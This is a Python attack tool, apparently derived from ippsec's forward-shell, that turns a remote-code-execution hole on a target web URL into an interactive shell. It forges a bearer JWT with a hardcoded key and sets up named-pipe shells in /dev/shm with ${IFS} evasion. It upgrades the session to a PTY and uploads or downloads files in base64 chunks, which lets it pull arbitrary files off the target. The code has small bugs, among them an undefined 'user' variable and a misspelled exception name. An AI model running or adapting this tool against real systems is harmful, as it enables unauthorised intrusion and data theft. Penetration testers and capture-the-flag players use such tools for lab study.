#!/usr/bin/python3
# -*- coding: utf-8 -*-
#
# Better-Forward-Shell Skeleton
# Original authors: ippsec, 0xdf
# Modified by : Cyberd0ve

import base64
import random
import requests
import threading
import time
import jwt
import math
import os
import argparse
import re 
import readline

space="${IFS}"

class WebShell(object):
    upgraded = False

    # Initialize Class + Setup Shell, also configure proxy for easy history/debuging with burp
    def __init__(self, url, proxy, interval, test):
        self.url = url
        self.proxy_addr = None
        if proxy:
            self.proxy_addr = proxy
            self.proxy = {'http' : proxy}
        else:
            self.proxy = {}
        self.session = random.randrange(10000,99999)
        self.stdin = f'/dev/shm/input.{self.session}'
        self.stdout = f'/dev/shm/output.{self.session}'
        self.headers = {}
        self.params = {}
        self.test = test
        self.delimiter = "{{{gerazgrzgregf}}}"
        self.regex_string = r'{{{gerazgrzgregf}}}(.*){{{gerazgrzgregf}}'
        self.regex = re.compile(self.regex_string,re.DOTALL)
        try:
            self.interval = float(interval)
        except Exception as e:
            print(e)
            exit()
        self.print_headers()
    
    '''
    ----------------------------------- MODIFY THIS FUNCTION -------------------------------------------
    Description: CraftPayload construct the HTTP headers and HTTP parameters to achieve the RCE on target
    Param: cmd_to_execute is a string of the shell command to execute on target.
    '''
    def CraftPayload(self, cmd_to_execute):        
        jwt_payload = {
       		'user': user
       	}
       	signing_key = 'SUPER_SECRET_KEY'
       	encoded_jwt = jwt.encode(jwt_payload, signing_key, algorithm='HS256')
        self.headers = {'Authorization': "Bearer "+encoded_jwt}
        self.params = {'cmd': cmd_to_execute}
    '''    
    -----------------------------------------------------------------------------------------------------
    '''
    
    '''
    ----------------------------------- MODIFY THIS FUNCTION -------------------------------------------
    Description: FindResultOfCmd() should return a string containing the expected result of the RCE. Remove all unecessary output given by the server
    Param: server_output is the raw output of the server
    '''
    def FindResultOfCmd(self, server_output):        
        matches = self.regex.search(server_output)
        if not matches:
            return
        cleared_result = matches.groups(0)[0].strip()
        if cleared_result == '\n':
            return
        return cleared_result
    '''    
    -----------------------------------------------------------------------------------------------------
    '''
    
    def print_headers(self):
        print("                                         ")
        print("-----------------------------------------")
        print("                                         ")
        print(" BETTER FORWARD SHELL ---- @Cyberd0ve  ")
        print("                                         ")
        print("-----------------------------------------")
        print("                                         ")
        print(f"[*] Target URL: {self.url}              ")
        print(f"[*] Proxy used: {self.proxy_addr}       ")
        print(f"[*] Session ID: {self.session}          ")
        print(f"[*] Interval: {self.interval}           ")
        print("                                         ")
        print("-----------------------------------------")
    
    def TestRCE(self):
        print("[*] Testing if RCE is reachable")
        test_cmd_write_to_tmp = f'/bin/echo{space}"{self.session}"{space}>/tmp/test.{self.session}'
        self.RunRawCmd(test_cmd_write_to_tmp)
        
        test_cmd_read_from_tmp = f'/bin/cat{space}/tmp/test.{self.session}'
        result = self.RunRawCmd(test_cmd_read_from_tmp)
        try:
            result = int(result.strip())
            if not result == self.session:
                raise Exception()
            print("[*] RCE is reachable !")
            test_cmd_clean_tmp = f'/bin/rm{space}/tmp/test.{self.session}'
            result = self.RunRawCmd(test_cmd_clean_tmp)
        except Exception as e:
            print("[*] RCE doesn't seems to be reachable..")
            exit()
        
    def Run(self):
        if self.test:
            self.TestRCE()
            exit()
        print("[*] Setting up fifo shell on target")
        MakeNamedPipes = f"/bin/bash{space}-c{space}'mkfifo{space}{self.stdin};{space}tail{space}-f{space}{self.stdin}|/bin/bash{space}>&{self.stdout}'"
        self.RunRawCmd(MakeNamedPipes, timeout=0.1)

        # set up read thread
        print("[*] Setting up read thread")
        thread = threading.Thread(target=self.ReadThread, args=())
        thread.daemon = True
        thread.start()
        return self
        
    # Clear output from /dev/shm/output.{session} 
    def ClearOutput(self):
        ClearOutput = f'/bin/echo{space}-n{space}""{space}>{self.stdout}'
        self.RunRawCmd(ClearOutput)

    # Read $session, output text to screen & wipe session
    def ReadThread(self):
        try:
            GetOutput = f"/bin/echo{space}{self.delimiter};/bin/cat{space}{self.stdout};/bin/echo{space}{self.delimiter};"
            while True:
                server_output = self.RunRawCmd(GetOutput)
                result = self.FindResultOfCmd(server_output)
                self.ClearOutput()
                if result:
                    if self.upgraded:
                        result = re.sub(r'^.*?\r\n', '', result).strip()
                        print('\r'+result, end=' ', flush=True)
                    else:
                        print(result, flush=True)
                time.sleep(self.interval)
         
        except Exception as e:
            print("[-] "+e)
            exit()
    # Execute Command.
    def RunRawCmd(self, cmd, timeout=50):
        self.CraftPayload(cmd)
        try:
            r = requests.get(self.url, headers=self.headers, params=self.params, proxies=self.proxy, timeout=timeout)
            return r.text
        except:
            pass
            
    # Send b64'd command to RunRawCommand
    def WriteCmd(self, cmd):
        b64cmd = base64.b64encode('{}\n'.format(cmd.rstrip()).encode('utf-8')).decode('utf-8')
        stage_cmd = f'/bin/echo{space}{b64cmd}|base64{space}-d{space}>{self.stdin}'
        self.RunRawCmd(stage_cmd)
    
    # Read file in chunk for optimisation    
    def ReadFileInChunk(self, f, chunk_size=1024):
        while True:
            data = f.read(chunk_size)
            if not data:
                break
            yield data
            
    # Upload local file to remote target    
    def UploadFile(self, filepath, chunk_size=1024):
        filename = filepath.split('/')[-1]
        try:
            # Create & Clear the file in remote target
            stage_cmd = f'/bin/echo{space}-n{space}""{space}>/tmp/{filename}'
            self.RunRawCmd(stage_cmd)
            i = 0
            
            # Calculate number of chunks necessary
            file_stats = os.stat(filepath)
            nb_chunk = math.ceil(file_stats.st_size/chunk_size)
            
            #Open file localy
            with open(filepath, 'rb') as f:
                # For each chunk
                for chunk in self.ReadFileInChunk(f):
                    # Encode it in Base64
                    b64data = base64.b64encode(chunk).decode('utf-8')
                    # Write chunck to remote file
                    stage_cmd = f'/bin/echo{space}-n{space}{b64data}|base64{space}-d{space}>>/tmp/{filename}'
                    self.RunRawCmd(stage_cmd)
                    # Show progression
                    progress = round(((i+1)/nb_chunk)*100, 2)
                    print(f'\r[+] Uploading {filename} : {progress}%                           ', end="")
                    i+=1
            print(f'\n[+] Uploaded file at (remote) /tmp/{filename})')
        except Exception as e:
            print(e)
    
    # Download target file to local machine
    def DownloadFile(self, filepath, chunk_size=6000):
        # Get filename
        filename = filepath.split('/')[-1]
        try:
            # Calculate number of chunks necessary 
            stage_cmd = f'wc{space}-c{space}{filepath}'
            try:
                size = int(self.RunRawCmd(stage_cmd).split(' ')[0])
            except Excpetion as e:
                print("Couldn't retrieve size of {filename}. Try with absolute path")
            nb_chunk = math.ceil(size/chunk_size)
            i = 0
            
            #Open file localy
            with open(filename, 'wb') as f:
                # For each chunk
                for i in range(nb_chunk):
                    # Read next chunk in remote file encoded in base64
                    stage_cmd = f'/bin/dd{space}if={filepath}{space}bs={chunk_size}{space}count=1{space}skip={i}{space}status=none{space}|{space}base64'
                    b64data = self.RunRawCmd(stage_cmd)
                    
                    # Write chunk to local file
                    f.write(base64.b64decode(b64data))
                    
                    # Show progression
                    progress = round(((i+1)/nb_chunk)*100, 2)
                    print(f'\r[+] Downloading {filename} : {progress}%                      ',end="")
                    i+=1
                print(f'\n[+] Saved {filename} in (local) current directory')
        except Exception as e:
            print(e)
                
    # Upgrade shell to spawn a TTY
    def UpgradeShell(self, method="python3"):
        # If already upgraded, early return
        if self.upgraded:
            return
            
        # Craft selected upgrade method
        if method == "python2":
            UpgradeShell = f"""/usr/bin/python2 -c 'import pty; pty.spawn("/bin/bash")'"""
        elif method == "script":
            UpgradeShell = f"""script{space}-qc{space}/bin/bash{space}/dev/null"""
        else:
            UpgradeShell = f"""/usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'"""
        print(f"[+] Trying to upgrade shell using {method}")
        
        self.upgraded = True
        
        # Send payload
        self.WriteCmd(UpgradeShell)
        self.ClearOutput()

def args_parser():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', required=True, help="Url to target")
    parser.add_argument('-p', '--proxy', required=False, help="Run over an http proxy", default=None)
    parser.add_argument('-i', '--interval', required=False, help="Interval between two consecutive fetch request on /dev/shm/output.{session}. Default: 1.3", default=1.3)
    parser.add_argument('--test', required=False, help="Test if RCE is reachable (For debug purpose)", action='store_true')
    parser.add_argument('--http-method', required=False, help="HTTP Method to use", action='store_true')
    return parser.parse_args()
    
def main():
    args = args_parser()
    ForwardedShell = WebShell(args.url,args.proxy,args.interval,args.test)
    ForwardedShell.Run()
    prompt = "> "
    
    while True:
        user_input = input(prompt)
        cmd = user_input.split(' ')
        if cmd[0] == "upgrade":
            if len(cmd)>2:
                method = cmd[1]
            prompt = ""
            ForwardedShell.UpgradeShell(method="python3")
        elif cmd[0] == "upload":
            ForwardedShell.UploadFile(cmd[1]) if len(cmd)==2 else print("[-] Usage: upload /path/to/local/file")
        elif cmd[0] == "download":
            ForwardedShell.DownloadFile(cmd[1]) if len(cmd)==2 else print("[-] Usage: download /path/to/remote/file")
        else:
            ForwardedShell.WriteCmd(user_input)
        time.sleep(ForwardedShell.interval * 1.1)
if __name__ == "__main__":
    main()
